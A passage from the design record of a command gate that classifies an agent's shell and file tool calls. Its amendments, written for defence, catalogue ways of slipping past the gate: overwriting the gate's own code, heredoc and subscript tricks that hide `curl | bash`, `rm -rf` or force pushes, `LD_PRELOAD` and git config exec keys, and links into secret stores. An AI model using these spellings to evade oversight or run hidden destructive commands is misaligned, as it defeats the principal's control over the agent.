  as `hermes-home`'s own other contents are not (the launch scripts the installer writes live in
  `$EXO_HOME/bin`, and Hermes' own state — its database, its registry — is not code). `cd` into a code folder
  also counts, like a `cd` into the store (#203's reading): a relative write after it asks. Now `cp evil.py
  ~/.exo/venv/lib/python3.13/site-packages/exo/gate.py` (an allowed `shell`), a `write_file` there (an allowed
  `local_write`), `pip install --target ~/.exo/venv/lib/python3.13/site-packages`, `tar -C ~/.exo/src`, `git
  clone ... ~/.exo/venv/evil` and a `.pth` beside `exo` ask. Reads stay reads. A delete or move counts like a
  `delete` of a store folder: `rm -rf ~/.exo/venv` and `mv ~/.exo/src x` ask, and so does `rm -rf ~/.exo`,
  since a code folder sits below the home it covers. A file tool keeps a `local_write` part and a line keeps
  its own command and parts, exactly as #435's amendment keeps them. Not protected, each for the reasons the
  #435 amendment gave first, now for the folders themselves: a developer's checkout named in
  `$EXO_PLUGIN_DIRS` (protected since this change, the cost accepted: the principal is asked for every edit in
  a checkout the session points the variable at, which everyday work avoids by leaving the variable unset), a
  `pip install` into the live venv (the gate is in it, so an installed wheel now asks; everyday work installs
  into a project or scratch venv), and `exo update`, `exo` venv inspections, which are reads and stay reads.
  The gate differential against main dcab371a (#423) ran the built-in corpus and the #435 review corpora,
  then the new writes of this change as rows, and lowered nothing.
  *Amendment 2026-10-26 (issue #612):* a venv or Hermes home the home's config.json records alone joins the
  protected list, which this amendment left out when it said the gate reads no config.json content (D-074) and
  told an install to write the locations into the environment. Nothing does: `scripts/install.sh` takes the venv
  from `EXO_VENV` at install time, writes that path back into config.json (`venv`, and `hermes_home` beside it),
  and nothing exports the variables when the daemon runs, so a supported custom install spells its code folders in
  the file alone, where the gate could not see them — `Config.load` resolved the recorded folder as the venv while
  a write into it classified `local_write` and was allowed. Since then the gate does read config content:
  `_store_roots` takes the store roots recorded in `principals` through `store.explicit_roots`, and `_code_paths`
  now takes the recorded `venv` and `hermes_home` the same way — a missing or unreadable file, or a value that is
  not an absolute path once ~ is expanded, adds nothing. The environment still takes precedence, as `Config.get`
  resolves it: a folder the file records joins the protected list beside what `EXO_VENV` or `EXO_HERMES_HOME`
  names, it never replaces one, so a decision main made stays made and only new folders are asked for. Everything
  else this amendment gave a code folder the venv keeps: a write in it asks as `store_write` on the floor, a `cd`
  into it makes the relative names after it count, a delete or move of it or of a folder above that holds it
  counts, and reads stay reads. The gate differential against main d4cc7ea3 (#423) ran the built-in corpus, then
  the new writes of this change as rows, and lowered nothing.
- **Decision, policy reload:** pin the policy at first load. A changed file is loaded and logged (`policy_change`
  row with file hashes) and each call is decided under both; the stricter wins. Loosening takes effect only after
  `/gate accept` or a restart. Chosen because it is simple and sound: a tool cannot loosen policy by any write path,
  seen or unseen, and the principal's own tightening still works at once. Rejected: an approval card for every
  policy edit (new protocol surface, and the principal's own editor edits would trip it); trusting mtime plus a trace
  event (a tool write that the gate missed would still take effect); detecting "made by a non-tool path" (background
  jobs run beside the turn, so the gate cannot tell who wrote a file).
  *Amendment 2026-10-19 (issue #211):* "the stricter of old and new" covered only the outcome. The approvers sent
  with an ask and the length of a new grant read the pinned `approvals.yaml`, so a seat the principal had just
  removed could still answer and an "always" outlived `days: 0`. Now an ask lists `gate.strictest_approvers`, the
  approvers both tables allow in the pinned order (the principal is first in both, so it is never empty), and a
  grant lasts the shorter of the pinned and changed `always` values. A wider table still waits for `/gate accept`;
  a table that does not load counts as the defaults. Limits: an ask already open keeps its approvers, and grants
  written before the change still match until they expire or are revoked.
- **Cost:** about 70 everyday commands are pinned as `allow` in `plugins/exo-gate/tests/test_default_ask.py`
  (`pytest`, `uv run pytest`, `git status`, `ls`, `rg`, `npm install`, `cargo test`...). New asks a user will see:
  `make`, `npm run`/`npm test`, scripts, `python -c`, unknown programs such as `kill` or `open`, and any write to the
  store. Each opaque ask is bound to the exact command.
- *Amendment 2026-10-18 (issue #137):* `_DEPTH = 4` bounds recursive shell inspection, for a `bash -c`, `sh -c` or
  `eval` chain called from the bash tool. A GitHub comment inside four nested wrappers remains `github_post`; at five
  it becomes `opaque_exec` and asks by default. A command inside a code string (`python -c`, `execute_code`) gets one
  more level wherever the code sits (`classify_code` starts again at `_DEPTH - 1`), so a chain that mixes wrappers and
  code strings can be read deeper than four; nested `$( )` is flattened and not capped, while nested backticks are
  (five levels are `opaque_exec`, "nested too deep to read"). Past the cap the line asks; an ssh/mosh chain past it
  asks too, with the first host as target (#153, fixed by #164). The card at the cap names the outermost
  wrapper (`bash runs shell commands`), the same card as `bash -c 'foo'`. Why not name the cap (#137's second remedy):
  `_combine` keeps the first of equally severe parts, so the `nested too deep to read` part that `xargs`,
  `find -exec`, `uv run` and `$( )` add at the cap reaches the card only when the outer part is benign; adding the
  same part at the `bash -c` cap would change nothing the principal sees. Showing the cap means letting an inner
  summary win ties in `_combine`, a classifier change for its own PR, so that remedy stays open. A category deny under
  `categories:` then fired only when the denied category was the line's most severe part: on a compound line a more severe
  part took over and the line asked, and approving it ran the denied action
  (`gh pr comment 3 --body hi && rm -rf build` is `delete`; lifted by the D-075 amendment for #191, 2026-10-19). An entry in the `deny:` list has matched every part
  the gate reads since D-075, so it denies that line; a `coproc` or `function NAME {` block whose inner command ranks
  at or below `opaque_exec` split the same way (denied under `deny: [web_read]`; asked under
  `categories: {web_read: deny}`, lifted by the D-075 amendment for #191, 2026-10-19, to deny as well). The known unread forms below were allowed outright on main, not asked, and no entry
  for the hidden action's category reached them. All have left this list: `${...}` bodies (#143), read since #158
  (the D-038 amendment of 2026-10-25), and on 2026-10-19 text piped or fed by heredoc to `ssh` with no remote command
  (#240), read since #303, and `git clone -c` with a command-running key, read as `git -c` is since #231. A `command:`
  regex reached them on the raw text only: the literal-word view (#136) is built from text the gate reads, so quoting
  evaded the regex inside these forms, as it no longer does inside them or inside an array subscript (read since #189), a
  value given to `declare` (read since #194, for #188), a command-valued option (read since #164 and #288) or a git
  config value (read since #231). The
  other deny-to-ask paths (`eval $(...)`, stdin-fed `xargs -I{} sh -c '{}'`, the body of `time { ...; }`, and the
  wrapper forms #160 left unread, such as `su -c`, `bwrap` and tmux `if-shell`) are listed in `docs/GATE.md` "Known
  limits".
  Rejected: raising `_DEPTH` (each level re-lexes the inner text, and five hand-nested wrappers are not a workflow,
  only a probe); naming the hidden command on the card (the gate did not read it). This records the limit of the
  existing decision; the pinning test is `test_shell_inspection_depth_limit`.
- **Not done:** the project-code limit stays. A trusted program that runs project code (pytest and conftest.py, git
  hooks, package install scripts) can run code the agent wrote earlier. A sandbox is the fix. `/gate accept` goes
  through `command.run`; binding who may call it to the connection is the server identity work (audit priority 3).
  *Amendment 2026-10-17 (issue #161):* the lexer attached a heredoc to the command whose line held the `<<`, which
  for `{ bash; } <<EOF`, `( bash ) <<EOF` and `while ...; do bash; done <<EOF` is the closing token, so the shell
  inside ran a body the gate never read (ask, where `bash <<EOF` with the same body is denied by a category deny).
  Now a heredoc or here-string after a closing `}`, `)`, `done`, `fi` or `esac`, and readable text piped into a
  compound, is fed to the commands inside it, nested ones included, except a command whose stdin is already set: its
  own heredoc, here-string or `<` redirection, a pipe from a command inside, an earlier `exec < file` inside
  (however spelled or prefixed, or possibly run by eval, source, `.`, a variable program or a function on the line),
  or a nested compound's own closer redirection or pipe (inner closers win, as in bash). Nothing is fed when the
  closer has its own `<`, and a closer heredoc wins over a pipe in. Feeding such a command would read decoy text as
  what the shell runs (`{ curl ... | bash; } <<< 'rm -rf build'` would leave `opaque_exec` for `delete`). Chosen
  over feeding only the last command: any inner command may read stdin. Only shells, interpreters and gh act on it, so
  `{ cat; } <<EOF` stays `read`, but the fed text can change the line's category and the summary shown at ask. Each
  text is classified once per line (the stdin of a `sqlite3`, `psql` or `mysql` client too, #154), every command it
  reaches still gets what that reading found (its own store check needs a delete there: skipping the repeat let a
  later `psql <store folder>` pass as a `delete`), a shared stdin is listed once, the parser finds command position
  and a closer's opener without rescanning, and the scan for function names on the line starts only where a word does,
  so the cost stays linear (a group of shells fed a body that is itself a group of fed shells was read width to the
  power of depth times, n here-strings fed to n shells cost n squared, and so did n openers in a row; a body after
  `<<$'EOF'`, which is also read as commands, was read once per command it reached, so nested groups of plain commands
  took a minute for 462 bytes, and groups of `psql` fed `\!` lines took 210 s for 604 bytes nested four deep; looking
  for `name()` from every character of an unbroken word took 26 s for one of 50,000 characters).
  For fed shells and interpreters, a line that was `opaque_exec` takes the inner category
  and carries the issue #178 floor. Only naming `opaque_exec` at `log` or `allow` turns that floor off.
  A `deny: [opaque_exec]` entry still denies these shell and interpreter lines (D-075). Under
  `categories: {opaque_exec: deny}` or an ordinary rule they then asked where they were denied, as
  `bash <<EOF` already did (lifted by the D-075 amendment for #191, 2026-10-19). Fed SQL clients follow their plain-input classification,
  without that floor. A compound feeding `\! git push origin main` to `psql` can change from ask
  to the push's `log`. D-075 `deny` and `reserved` entries still match every retained part.
  A category line or rule that denies a part denies the line (#191); other category lines and rules use the combined classification. `coproc W { ...; }
  <<EOF` and `function NAME { ...; } <<EOF` are fed the same way, as #181 reads their bodies; the body of `time { ...;
  }` is not read at all, so it still asks as `opaque_exec`. A closer heredoc wins over a pipe in on stdin only; the
  lexer drops fd numbers, so one on another fd (`{ bash; } 3<<EOF`) is read as stdin: its body is fed, and text piped
  in reaches only the first command inside, so in `echo ... | { true; bash; } 3<<EOF` bash is read with the body, not
  the pipe it reads. A shell read that way still asks at least, as `bash 3<<EOF` does and as main asks.
  *Amendment 2026-10-17 (issue #192):* on a line that enters a folder that can hold a secret store, a relative read of
  a store file is `credentials`. The hints come from the sample store paths, per call: the store folders (a dot folder
  along a sample below home by its name, a plain one only below its parent, such as `.config/gh`, `.exo/keys` or
  `/proc`, so a checkout called `exo` is not one) and the store file names. A line enters a store folder when any
  `cd`, `pushd`, `git -C`, `env -C`, `sudo -D` or `tar -C` target in it, wherever it stands and however it is spelt,
  has a store folder among its parts (`..` resolved as bash's `cd` does, a brace set or range as its words), or goes by
  a relative name, also through `..` or after `cd ..`, into a plain store folder below another target (a dot parent by
  its name, a plain one by its path; a folder entered this way is a parent in turn). On such a line a relative name in
  its words, redirections, uploads and `$( )`, `<( )` or `bash -c` bodies (not the targets' own words, the program and
  the words before it except assignments, a `git` subcommand, a jq filter (not `-f`), or prose with a space and no
  unquoted brace set) counts when its file name is a store file name (a glob, read with bash's bracket and leading-dot
  rules: when it could match one) or it goes into a store folder; the folder itself (`.`) counts when a target is a
  store folder, and any relative name when a target is itself a store, a glob target included. A name that goes into a
  plain store folder from its parent counts on any line when it names a store. Chosen over following the folder per
  command or per line, which
  review showed misses shell semantics (`||`, `!`, `time`, a `cd` in `$( )`), grows exponentially on scripts that walk
  folders and needed caps that failed open or asked on ordinary scripts. This model is linear, and where it bounds
  work (16 brace words, 64 `cd ..` levels or glob candidates, many `[`) it fails closed. The cost, failing closed:
  neither the order nor the success of the commands is followed, so a word named like a store file asks on such a line
  even when it is elsewhere or not a file (`cd ~/.kube && cd ~/project && cat config`,
  `cd ~/.config/fish && cat config`, `npm config` in `~/.config/nvim`), and `.` asks in a store folder. Lines that
  enter no store folder and name none are unchanged. A `store_write` line stays `store_write`, the principal's alone.
  Known limits: a target in a variable or made by a command (`cd $X`), a name made by a command or with a space in it
  (`cat $(ls)`, `"$(pwd -P)/config"`), a dot store folder named last in an operand (`tar czf x ../.kube`), a relative
  target taken from another relative one (`cd ~/.config && cd nvim && cd ../gcloud`), a glob in the parent of a plain
  store folder (`cd /sr?/exo-home && cd keys`), a plain store folder reached from more than one level above its parent
  (`cd / && cd srv/exo-home/keys`), other `${PWD...}` forms, the text `eval` runs, `cd -` and `OLDPWD`, `CDPATH`,
  `HOME` set on the line, `dotglob`, and a store reached through a folder link whose name does not say so.
  *Amendment 2026-10-16 (issue #136):* a `command:` regex in `deny` and `reserved` matched the command text
  only, so `'git' push`, `g\it push`, `git pu''sh` and `$'rm' -rf` walked past a veto the lexer had already
  decoded. Those regexes now also match a literal-word view (`_policy_command_view`: the lexer's decoded words,
  operators kept, shell syntax inside a word escaped, dynamic words and heredoc bodies as placeholders made of
  control characters, which no literal word renders to), merged through the classifier's existing recursion
  into `$( )`, backticks, `bash -c`, `eval`, shell stdin and every string literal of code. A non-empty
  `$"..."` word is read as bash reads it without a catalog, so the line keeps its category, target and the
  vetoes keyed on them, and adds the `indirection` and `locale translation` signals, so it asks unless
  opaque_exec is named: with a message catalog and a non-C locale bash runs the translation, and expands
  `$( )` in it. The line is also decided as opaque_exec and the stricter outcome stands, so a veto on
  opaque_exec holds for it too. `$"..."` inside `${...}` is read by the parameter-word scan since #158, without
  the locale-translation signal (#143). A heredoc delimiter spelled `$"EOF"` or `$'EOF'` ends the body on different lines in bash and in
  dash (the shell tool's fallback when bash is missing), so that body is read as commands too. A `deny` or
  `ask` rule keyed on `command:` sees the view in a second pass that only raises; the first-match rule is still
  chosen on the original text. Allow and lower rules and grants match the original text only: the view adds
  vetoes and never authorizes. Accepted cost, fail closed: a literal that code only prints, and separately
  quoted data arguments under an unanchored regex, are matched too. The reason names only the policy entry,
  never the matched words: the hook writes decisions to the signed ledger, which holds no command text.
  *Amendment 2026-10-17 (issue #179):* bash runs a `$( )` or backticks inside the array subscript of a variable
  name, even when the name is single-quoted, so `printf -v 'a[$(gh pr comment ...)]' %s x` was `read` (allow). The
  name arguments of `printf -v`, `read`, `declare`, `typeset`, `local`, `unset`, `test -v`/`[ -v` and `wait -p`
  are now read for a subscript: each command in it is classified like a `$( )`, and since bash evaluates the
  command's output (or a variable's value) as arithmetic too, any expansion or quoting there also asks through the
  `indirection` signal, not an `opaque_exec` part, so a deny on the line's own category still wins. A subscript
  without expansion and plain names keep their class; a bare name such as `a[i]` is a known limit (GATE.md).
  The scan finds the `]` that ends the subscript as bash does: a nested `[ ]` counts, and a `\` outside single
  quotes hides the next character, so `a[\$(cmd)]` reads no command, as bash runs none. In a nested subscript
  bash before 5.2 runs a `\$( )` again, so the gate reads it there. Past the depth cap a command there is
  `opaque_exec`, as an unquoted `$( )` is.
  *Amendment 2026-10-17 (issue #188):* `declare`, `typeset`, `local`, `readonly` and `export` evaluate the value of
  a `NAME=VALUE` operand again: with `-a` or `-A` a compound value `(..)` is parsed again as words even when quoted
  (the gate reads it with or without them, which is only stricter), and for the first three a `-i` value is
  arithmetic and a `-n` value is a name whose subscript bash evaluates when used. So `declare -a 'b=($(gh ...))'`,
  `export -a 'b=(<(gh ...))'` and `declare -i x='a[$(gh ...)]'` were `read` (allow). Those values are now read with
  the subscript scan: each `$( )`, backticks or `<( )` in them is classified like a `$( )` and added after the
  line's own parts, as the line parse adds an unquoted one (so it does not take a tie from a redirection), a
  `[key]=` is read as a subscript, and a quoted operand after one or more unquoted compound ones is read too. A
  backslash-newline is dropped from a compound value before it is read, as bash drops it first (an `-i` or `-n`
  value keeps it, as bash does), and a `$( )` the line's own parse read is not read again, also when it holds a
  backslash-newline. A body that holds a single quote or a here-document marker (`<<`) anywhere is compared as
  written: bash keeps a backslash-newline in single quotes or a quoted here-document but not in the value it reads
  again, and the gate does not track where it is, so with a backslash-newline such a body is read again and asks
  (`declare -a "b=($(ls 'x' \<newline> -l))"`, only stricter: bash runs the same command). A command the
  line runs only because bash reads a value again also asks through `indirection`, as does an expansion in a `-i` or
  `-n` value, in a `-i` element, or in a compound value the line itself expanded. So when such a command outranks
  the line's own category, a deny on that category became ask, never allow or log
  (`declare -a 'b=($(sudo ls))' > /tmp/f` under `categories: {local_write: deny}`); D-075 (#126) kept the deny
  for the `deny:` list form, and the D-075 amendment for #191 (2026-10-19) lifted the `categories` form
  too, so that line denies now. That command also carries the `reread` signal,
  and naming `opaque_exec` does not lower its ask, which stands in for the line's own deny:
  `{local_write: deny, opaque_exec: allow}` asked too, lifted by the D-075 amendment for #191,
  2026-10-19, to deny; the line denies now. Past the
  depth limit such a command, or one in a subscript, is an `opaque_exec` part, as on the line itself, with `reread`.
  A plain expansion in a compound element without `-i` (`'b=("$@")'`) is expanded once and asks nothing, and the
  unquoted compound form keeps the line parse's reading. readonly and export never evaluate a name's subscript, so
  their names are not read. A later plain assignment to a `-i` or `-n` variable and values that come whole from a
  variable stay a known limit (GATE.md).
  *Amendment 2026-10-17 (issue #160):* wrappers that run a command were unknown or opaque programs, so the command
  was never classified and a deny on its category asked (`setsid git push origin main`, `flock /tmp/l git push`,
  `watch git push`, `script -qc '...'`, `tmux new-session -d '...'`, `screen -dm ...`, `parallel git push :::
  origin`). The gate now reads them as it reads `xargs` (`gate._WRAPPERS`, `_classify_wrapper`): options and fixed
  operands are skipped as getopt reads them, and the argv or the command string (`flock -c`, `script -c`, `watch`
  through `sh -c`, a tmux shell-command, a parallel template) is classified as a nested command beside an opaque
  part, so the line asks as before. Until D-075 lands, the line is denied only when what runs outranks
  `opaque_exec` (`delete`, `vcs_push`, `credentials`); a category that ties with it or ranks below it
  (`schedule`; `web_read`, `local_write`) still asks, as for `coproc`. A tmux command list is split as tmux
  splits it: an argument ending in `;` ends a command, one ending in `\;` does not; tmux's default aliases
  `splitp` and `split-pane` name `split-window`. An environment dump behind a wrapper is `credentials`, as behind a
  prefix or runner (#155): the wrapped argv goes through the same `_env_dump` check. `chroot`, `nsenter`, `unshare`
  and `systemd-run` follow the `sudo` precedent: a signal named after the wrapper, reversible counts as costly. Forms
  the gate cannot read (a variable, `tmux send-keys`, `screen -X stuff`, `parallel` without a template) stay
  `opaque_exec`. A deny on `opaque_exec` itself no longer reaches a wrapped command that outranks it, as with
  `bash -c` and `xargs`, so the line asks there (it was denied) until D-075. To keep that an ask and not the inner
  category's `log`, this change carries #178's floor rule: only naming `opaque_exec` at `log` or `allow` turns the
  indirection floor off. A `parallel` template is read per argument only on the line itself (16 distinct
  arguments, four times that command's own length, each text sized before it is built); a nested one is read
  alone, so a template that is a parallel line cannot multiply the work. `function NAME {` from the same issue is
  read by #181.
  *Amendment 2026-10-17 (issue #167):* the lexer decoded `$'..'` with Python's `unicode_escape`. Bash's short
  escapes (`\u65`, `\x4`, `\U41`), its 8-bit octal (`\545` is `e`), `\x{..}` and its NUL cut-off differ from that,
  so `git push $'--forc\u65' origin main` read as a plain push while bash ran a force push. `$'..'` is now decoded
  by bash 5.2's ANSI-C rules in a UTF-8 locale (`gate._ansi_c`), checked escape by escape against bash. A `\u` or
  `\U` value that is no character is written as bash's u32toutf8 writes it (up to six bytes that are not ASCII,
  nothing from 0x80000000 on), so every `$'..'` word is read. Category and target vetoes see the decoded word; a
  `command:` regex still sees the raw line until the literal-word view (#187) uses the same decoder.
  *Amendment 2026-10-18 (issue #130):* the store floor resolved the store roots but matched only the lexical
  normpath of the path written, so a symlink alias into the store (`ln -s ~/.exo/state /tmp/s`, then a write to
  `/tmp/s/approval-grants.json`) was a local write. `is_store_path` and the `cd` check now compare the union of two
  spellings, the lexical normpath and the realpath, of both the candidate and each store root. Resolving the
  original spelling keeps `symlink/..` in filesystem order, and the lexical form keeps a protected entry that links
  out of the store protected. A path that cannot be resolved (a NUL byte, an unencodable character, a loop) keeps
  its lexical form, so a resolution failure never weakens a check. `cd`, `pushd` and `git -C` into an alias of the
  store count as being in the store. Links planted in the same command count as writes to what they alias: `cp -s`
  and `cp -l` (and their long-option prefixes), and a relative `ln` target read against each absolute folder the
  link can land in (the last `-t DIR`, the last operand and its parent, with options anywhere on the line). Not
  done, listed in `docs/GATE.md`: TOCTOU, earlier hardlinks, a protected entry that links out of the store,
  case-insensitive filesystems, glob spellings, relative link chains and folders, the bash tool's `cwd` argument,
  and file-descriptor magic links (#217).
  *Amendment 2026-10-18 (issues #153, #154, #155):* an `ssh`/`mosh` chain past the four-level cap asks as
  opaque_exec and keeps the first host as target. Options of allowlisted programs whose value is a command
  (`tar -I`, `rsync -e`, `ssh -o ProxyCommand`, `git rebase -x`, `less +!`, sqlite3 and psql shell escapes,
  `GIT_SSH_COMMAND=` before the program...) are classified as nested commands, and a value the gate cannot read
  asks. The options are read as each program's getopt reads them, with the program's own value-taking options
  and boundaries: a cluster ends at its first value letter (`-oProxyCommand=cmd` is `-o`), and ssh's options
  end at its remote command (every word is read when one may expand to no word or several, `$A` or `"$@"`). Reading more than getopt would is fail closed, reading less is a bypass, so a table
  of value-taking options lists only options known to take one. Rejected: scanning every word for option
  letters (the earlier form of this change), which lost `-oProxyCommand` to a later `o` and asked on `ssh host
  curl -I URL`. Environment dumps are credentials behind runners and prefixes too (`uv run printenv X`).
  *Amendment 2026-10-18 (issues #230, #232):* follow-ups to the above. An ssh `-o` keyword the gate cannot read (`-o
  "$OPT"`, a glob, an unclosed quote an expansion may close) asks as opaque_exec, like any other value in a variable.
  `git ls-remote --exec`, a hidden synonym of `--upload-pack`, is followed (ls-remote rejects `-u`, which is still
  read: reading more than git is fail closed). An assignment before a command is any form bash takes (`NAME+=value`,
  `NAME[i]=value`), so a dump behind one is credentials. tar's `--checkpoint-action` is read in any abbreviation
  longer than `--checkpoint` (an option of its own, whose optional value must not swallow the next word); `mosh
  --ssh` in any case and after `+` is read by D-075's mosh reading (#126). Two asks the first change
  added are dropped, and those lines classify exactly as before it: ssh's `none` value for a command or library
  setting, which ssh_config documents as switching the setting off (CLEAR_ON_NONE, any case, the bare word only), and
  a `psql` line starting with `system`, which is mysql's command and SQL in psql.
  Rejected: keeping them as fail-safe asks, since they are ordinary spellings and the gate's docs never claimed them.
  *Amendment 2026-10-19 (#231):* a variable set on the line was read only when its value is a command (#154), so a
  variable that loads code or moves where programs and config files are found was dropped unread: `LD_PRELOAD=/t/x.so
  ls`, `PATH=/tmp/bin ls` and `HOME=/tmp/h git log` were `read` (allow). *Variables.* The loader variables
  (`LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`, `GCONV_PATH`, the `DYLD_*` paths, `OPENSSL_CONF`, `OPENSSL_ENGINES`,
  `OPENSSL_MODULES`), the lookup and startup variables (`PATH`, `HOME`, `XDG_CONFIG_HOME`, `BASH_ENV`, `ENV`,
  `ZDOTDIR`, `GIT_EXEC_PATH`, `GIT_TEMPLATE_DIR`, `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, the Python, Perl, Ruby
  and Node module paths and startup files, `PSQLRC`), the option variables (`TAR_OPTIONS`, `NODE_OPTIONS`, `PERL5OPT`,
  `RUBYOPT`, `MANOPT`, `ZIPOPT`, `RIPGREP_CONFIG_PATH`, `LESS` with a `+` command) and a non-empty `CDPATH` are
  `opaque_exec`, named in the summary (`gate._EXEC_ENV_OPAQUE`; the list with reasons is in `docs/GATE.md`). That
  holds wherever the line sets one: before a program, through `env`, `sudo`, `nice` or `timeout`, exported or bare,
  as a parameter-expansion assignment (`${PATH:=.}`), through `read`, `printf -v`, a `for` loop or a nameref, or as an
  integer through arithmetic, a subscript or a `{PATH}>` redirection. A name the gate cannot read asks too. More
  command-valued variables (`GIT_PROXY_COMMAND`, `GH_PAGER`, `PSQL_PAGER`, `SUDO_ASKPASS`, `PROMPT_COMMAND`...) are
  read as commands under #154's rule. Only text bash expands counts: the lexer records each `${..}` and `$((..))` it
  expands, read to the `}` bash closes it with, so single-quoted text, a quoted here-doc and a glob bracket never
  ask. The scan is linear in the line (brace, bracket and paren pairs are each found in one pass, a nested value
  longer than 64 characters stands in its parent's value as `${_}`), because classify runs inside the gate hook:
  the first form re-read the line for every unclosed `${NAME:=` and took 145 s for 64 KB. *One git config check.*
  `_git_config_kind` reads a key the same way wherever it is set: `git -c`, `git config`, `git clone -c` or
  `--config`, `git --config-env` (attached or not), `GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>` and
  `GIT_CONFIG_PARAMETERS`. The value of an exec key is classified as a command, so a category deny fires on it
  (`git clone -c core.sshCommand='rm -rf ...'` is `delete`); a key that loads another config file or a template
  (`include.path`, `includeIf.*.path`, `init.templateDir`) asks, as do `git clone --template` and `git init
  --template`. `git config` is read as git reads it: its subcommand (`set`, `get`...) and the values of `-f`, `-t`,
  `--file`, `--blob`, `--type`, `--default`, `--comment`, `--value` and `--url` are not the key, also under any
  unique prefix git accepts for a long option (`--fil`, `--ty`, `--rename-sec`), a value set for an
  exec key is classified as the command it is, and `rename-section` asks (it can turn `x.path` into
  `include.path`). The exec keys also cover any key whose last part ends in `command` or `cmd`,
  `interactive.diffFilter`, `remote.<name>.uploadpack`/`receivepack` and a difftool, mergetool, man or browser
  `.path`; and a switch that lets git run an `ext::` URL asks (`protocol.allow`, `protocol.ext.allow`, an `ext::`
  `insteadOf` rewrite, a remote URL that starts with `ext::`, `GIT_ALLOW_PROTOCOL`). *env and sudo.*
  Both read `NAME=VALUE` from their own argv, quoted or not, so a quoted one after them is read as the assignment it
  is: the variable is checked, and the rest is the command it is (`env 'FOO=a b' ls` is `ls`, where it was an
  unknown program; `env 'X=1' rm -rf /srv/data` is `delete`). After `nice`, `timeout` and the other prefixes a
  quoted `NAME=VALUE` is still the program, as the shell runs it. Left out: `IFS`, which does not change how
  literal words split. `PS4` is read as a command-valued variable, as the double-quoted text bash expands before
  every traced command (`set -x` needs no interactive shell, unlike `PROMPT_COMMAND`; #168 scrubs an inherited one
  for the same reason). Arithmetic assigns with `++`, `--` and `<<=`/`>>=` too. Known limits (rarer expansion forms
  that can still set a variable unseen) are listed in `docs/GATE.md`. *Cost, and what stays allowed.* A line that
  sets one of these variables asks where it was allowed, except for values that change nothing the gate relies on:
  an empty loader variable, `GIT_CONFIG_GLOBAL`/`SYSTEM` set to `/dev/null`, a `PATH` of `$PATH` and folders the
  gate already trusts a program from by path (system bin folders, a virtualenv's `bin`, `node_modules/.bin`), and
  `PYTHONPATH` before `pytest` or `python -m pytest`, which already run the project's code. `$PATH` counts as the
  current value only where bash expands it: an assignment whose source holds single quotes, `$'..'` or a backslash
  gets no PATH exemption, since there `$PATH` can be a folder of that name (`export PATH='$PATH:/usr/bin'`).
  Deliberate asks: an empty `PATH` element (the current folder), a folder written with `..` (resolved through
  links, not lexically), any other `PATH` folder, appended or not, since it supplies every program the earlier
  folders lack (`export PATH="$HOME/.local/bin:$PATH"`), and `PYTHONPATH` before any other program or exported. Rejected: exempting any append-only `PATH`, which lets a planted program stand in for one the
  gate trusts by name but the machine lacks.
  *Amendment 2026-10-19 (issues #209, #202, #225, #199):* four spellings reached a secret store without its name,
  and the gate read them as plain reads. A link is judged by where it leads: a path is resolved from the gate's own
  folder, from the session's working folder (the core passes it to tool hooks as `cwd`; each hook gets only the
  keywords it declares) and, for a shell tool, from that folder joined with the call's own `cwd` argument (a file
  tool ignores that argument, so the gate does too), and a resolved path a link led to is matched by name; a relative path that
  stays below its folder is matched by its part there, so a session in a repo's `.claude/worktrees` checkout is not
  asked about every link. A `.pub` name exempts only a path that resolves to one. `${VAR:-word}` and the other
  operators of `HOME`, `EXO_HOME`, `CLAUDE_CONFIG_DIR` and `EXO_PRINCIPAL_STORE` are read with the value and with the
  default; both count. A shell word with a `$( )`, a backtick pair or an unknown variable is also matched with each
  one empty, and with each one between two literal parts read as `*`. A glob is read in bash's bracket syntax
  (`[^x]`, POSIX classes), and `/proc/<pid>/<glob>` is matched against `environ` (a thread's
  `/proc/<pid>/task/<tid>/<glob>` too since the #313 amendment below, 2026-10-21). Rejected: treating every
  expansion inside a word as opaque, which would ask on `cat notes-$(date +%F).md`; refusing links in `read_file`
  alone, which leaves the shell open. The checks of one classify call share their file-system lookups, which made a
  10 KB line several times faster. Limits in `docs/GATE.md` "Other spellings of a store path".
  *Amendment 2026-10-19 (issues #207, #240):* two programs the gate skipped are read. bash takes a compound opener
  after `coproc NAME` as a reserved word only when the two tokens before it are `coproc` and the name, so a
  redirection, heredoc or here-string between them gives a simple command that runs the name (`coproc rm >/dev/null
  { -rf x` deletes); the lexer marks a word followed by one, and the gate then reads the name as the program too,
  beside the skipped reading, which stays so nothing it denied is lost. With no remote command, the login shell
  `ssh host` starts runs ssh's stdin; a piped, heredoc or here-string text is read as shell, as for `bash -s`, and
  the line asks, with the parts `internal` (D-075). ssh's options after the host are read up to the remote command;
  `-n`, `-N`, `-f` or a remote command keep the old reading, and a word that may expand to no word or several before
  the command, or as all of it, reads the stdin too (fail closed). As with wrappers, the line takes the category of
  what runs, but the old reading stays a part: `deny` and `reserved` entries see every part (D-075), and since #191
  (#306) so does a `categories:` setting or rule that denies (`opaque_exec` for the coproc lines, `shell` or the host
  as target for ssh), so these lines are denied as before. Rejected: reading both coproc readings whenever
  the line has any redirection (the issue's first sketch), which reads the name as a program in `coproc rm { echo
  >/dev/null hi; }`, where bash runs a named compound.
  *Amendment 2026-10-19 (issue #328):* the lexer ended a heredoc at the first line that equalled the delimiter once
  its surrounding whitespace was stripped, so a delimiter with a space (`<<'EOF '`, `<<"EOF "`, `<<' EOF'`, `<<EOF\ `)
  never matched: every later line, including the real terminator, was read as body, and the commands after it were
  never classified. `cat <<'EOF ' ... EOF ` then a force push was `allow` as a bare `cat`. Now the lexer ends the body
  on the line that equals the delimiter exactly, as bash does: the delimiter is the opener word after quote removal
  (its spaces, tabs and other characters kept; leading tabs dropped on the terminator only for `<<-`), matched for
  every quoting form (`'..'`, `".."`, `\`-escapes, mixed quoting). When no line ends the body, or a line ends it only
  once surrounding whitespace is dropped, the gate keeps reading to the exact terminator or end of input and
  reads that whole body as commands too, fail closed. A CR in the delimiter is retained; `EOF)` ends a body only
  inside a command or process substitution. Named descriptor assignments keep the hidden-variable checks. The `<<$'EOF'`/`<<$"EOF"`
  case keeps its own fail-closed reading (bash and dash disagree; bash, verified, expands a `$'..'` delimiter). A
  `{var}<<` heredoc or `{var}<<<` here-string, which bash 4.1+ puts on a new descriptor rather than stdin, is no longer
  read as a command's stdin, as a numbered `3<<` already was not: so a gh post whose real body is a pipe is not
